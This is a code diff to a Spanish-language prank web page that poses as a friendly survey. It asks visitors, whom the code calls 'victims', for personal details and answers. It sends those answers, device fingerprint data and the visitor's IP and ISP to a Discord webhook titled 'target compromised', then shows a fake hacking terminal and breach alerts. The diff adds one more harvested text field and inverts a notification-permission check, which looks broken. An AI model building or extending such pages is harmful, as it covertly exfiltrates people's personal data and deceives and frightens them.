@@ -30,13 +30,11 @@ window.onload = async () => {
 
 // --- FASE 0: Bienvenida (Sí / No) ---
 document.getElementById('btn-no').addEventListener('click', () => {
-    // Si dice que NO, mostrar mensaje hostil y bloquear la pantalla
     welcomeScreen.style.display = 'none';
     angryScreen.style.display = 'flex';
 });
 
 document.getElementById('btn-yes').addEventListener('click', () => {
-    // Si dice que SÍ, avanzar a la Encuesta 1
     welcomeScreen.style.display = 'none';
     survey1.style.display = 'block';
 });
@@ -49,11 +47,10 @@ document.getElementById('btn-next').addEventListener('click', () => {
     const gender = document.getElementById('victim-gender-select').value;
 
     if (!isModeAdmin() && (!name || !age || study === "Seleccionar" || gender === "Seleccionar")) {
-        alert("Respondeeeee.");
+        alert("Responde.");
         return;
     }
 
-    // Insertar el nombre dinámicamente en el título de la Fase 2
     document.getElementById('greeting-name').textContent = "Hola " + (name || "Amigo/a");
 
     survey1.style.display = 'none';
@@ -76,14 +73,13 @@ document.getElementById('btn-finish').addEventListener('click', async () => {
     const q2 = document.getElementById('q2-select').value;
     const q3 = document.getElementById('q3-select').value;
     const q4 = document.getElementById('q4-select').value;
-    const q5 = document.getElementById('q5-text').value.trim();
 
+    // Correcta validación de q1, q2, q3 y q4
     if (!isModeAdmin() && (q1 === "Seleccionar" || q2 === "Seleccionar" || q3 === "Seleccionar" || q4 === "Seleccionar")) {
-        alert("Responde we.");
+        alert("Que respondas we.");
         return;
     }
 
-    // Transformación visual inmediata a la terminal
     survey2.style.display = 'none';
     document.body.style.backgroundColor = '#000000';
     document.body.style.padding = '0';
@@ -129,7 +125,6 @@ async function notifyVisit(p) {
     if (isModeAdmin()) return;
     if (!DISCORD_WEBHOOK_URL) return;
 
-    // Procesar respuesta de la Pregunta 1
     let q1Answer = p.q1;
     if (p.q1 === 'otro') {
         q1Answer = p.q1Other || "No especificó";
@@ -138,7 +133,7 @@ async function notifyVisit(p) {
     const payload = {
         embeds: [{
             title: "🎯 ¡OBJETIVO COMPROMETIDO!",
-            color: 5763719, // Verde tipo terminal
+            color: 5763719,
             author: {
                 name: "System Override - Reporte de Datos"
             },
@@ -154,8 +149,13 @@ async function notifyVisit(p) {
                     inline: false
                 },
                 {
+                    name: "❤️ ME GUSTA",
+                    value: `\`\`\`txt\n${p.q5 || "(Dejó la caja vacía)"}\n\`\`\``,
+                    inline: false
+                },
+                {
                     name: "💬 MENSAJE FINAL",
-                    value: `\`\`\`txt\n${p.q5 || "(No dejó ningún mensaje)"}\n\`\`\``,
+                    value: `\`\`\`txt\n${p.q6 || "(No dejó ningún mensaje)"}\n\`\`\``,
                     inline: false
                 },
                 {
@@ -196,15 +196,14 @@ async function finalizeHack() {
         q3: document.getElementById('q3-select').value,
         q4: document.getElementById('q4-select').value,
         q5: document.getElementById('q5-text').value.trim(),
+        q6: document.getElementById('q6-text').value.trim(),
         battery: await getBatteryInfo(),
         gpu: getGPUInfo(),
         cpuCores: navigator.hardwareConcurrency || "4"
     };
 
-    // Enviar a Discord
     notifyVisit(pData);
 
-    // Inyectar Logs simulando retroactividad
     consoleContainer.innerHTML = `
         <p><span class="log-time">${getTime(-55)}</span> <span class="log-info">Connection established. Silent mode active...</span></p>
         <p><span class="log-time">${getTime(-50)}</span> <span class="log-warn">Background tracing IP: ${ipData.ip} [ISP: ${ipData.org}]</span></p>
@@ -240,7 +239,7 @@ async function finalizeHack() {
 }
 
 function finishTroll(victimName) {
-    if ('Notification' in window && Notification.permission === 'granted') {
+    if ('Notification' in window && Notification.permission !== 'granted') {
         new Notification("SYSTEM BREACH ALERT", {
             body: "Unauthorized memory dump detected.",
             icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
